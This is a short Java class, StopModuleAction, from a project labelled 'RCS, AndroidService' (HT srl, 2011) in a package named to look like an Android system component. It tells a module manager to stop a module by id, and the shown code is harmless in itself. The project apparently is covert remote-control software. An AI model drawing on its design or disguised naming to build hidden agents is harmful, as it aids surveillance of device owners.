/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StopAgentAction.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.action;

import org.json.JSONObject;

import com.android.networking.Trigger;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfAction;
import com.android.networking.manager.ManagerModule;
import com.android.networking.util.Check;

public class StopModuleAction extends ModuleAction {
	public StopModuleAction(ConfAction params) {
		super(params);
	}

	private static final String TAG = "StopAgentAction"; //$NON-NLS-1$

	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + moduleId);//$NON-NLS-1$
		}
		final ManagerModule moduleManager = ManagerModule.self();

		moduleManager.stop(moduleId);
		return true;
	}

}
